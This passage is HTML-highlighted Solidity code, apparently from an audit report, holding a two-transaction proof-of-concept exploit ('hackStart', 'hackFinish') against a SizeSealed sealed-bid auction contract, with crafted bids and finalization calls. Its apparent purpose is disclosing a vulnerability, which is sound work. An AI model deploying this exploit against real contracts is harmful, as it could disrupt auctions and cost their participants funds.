class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ExternalBidder</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">privateKey</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xabcdabcd</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">SizeSealed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sizeSealed</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sellerPrivateKey</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">message</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sizeSealed</span><span class=\"mtk1\">), </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">encryptedMessage</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">ECCMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encryptMessage</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ECCMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">publicKey</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sellerPrivateKey</span><span class=\"mtk1\">), </span><span class=\"mtk12\">privateKey</span><span class=\"mtk1\">, </span><span class=\"mtk12\">message</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sizeSealed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bid</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">auctionId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">message</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ECCMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">publicKey</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privateKey</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">encryptedMessage</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PoC</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">SizeSealed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sizeSealed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MintableERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MintableERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ExternalBidder</span><span class=\"mtk1\"> </span><span class=\"mtk12\">externalBidder</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hackStartTimestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">firstAuctionId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">secondAuctionId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">privateKey</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xc0de1234</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">sizeSealed</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">SizeSealed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token1</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MintableERC20</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token2</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MintableERC20</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">externalBidder</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ExternalBidder</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// First transaction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">hackStart</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hackStartTimestamp</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hackStartTimestamp</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk7\">123</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sizeSealed</span><span class=\"mtk1\">), </span><span class=\"mtk7\">123</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">firstAuctionId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">123</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">firstAuctionId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">externalBidder</span><span class=\"mtk1\">), </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">externalBidder</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createBid</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">token2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">sizeSealed</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">firstAuctionId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">privateKey</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\"> &lt;&lt; </span><span class=\"mtk7\">128</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk7\">321</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sizeSealed</span><span class=\"mtk1\">), </span><span class=\"mtk7\">321</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">secondAuctionId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">321</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">secondAuctionId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">externalBidder</span><span class=\"mtk1\">), </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">externalBidder</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createBid</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">token2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">sizeSealed</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">secondAuctionId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">privateKey</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\"> &lt;&lt; </span><span class=\"mtk7\">128</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// external to be used in try+catch statement</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">finishAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">sizeSealed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">reveal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">privateKey</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">sizeSealed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">finalize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bidIndices</span><span class=\"mtk1\">, </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">, </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Second transaction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// block.timestamp should be greater or equal to (block.timestamp of the first transaction) + 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">hackFinish</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hackStartTimestamp</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">hackStartTimestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk4\">this</span><span class=\"mtk1\">.</span><span class=\"mtk11\">finishAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">firstAuctionId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// expected</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">catch</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk4\">this</span><span class=\"mtk1\">.</span><span class=\"mtk11\">finishAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">secondAuctionId</span><span class=\"mtk1\">) {</span></span></span>\n<span 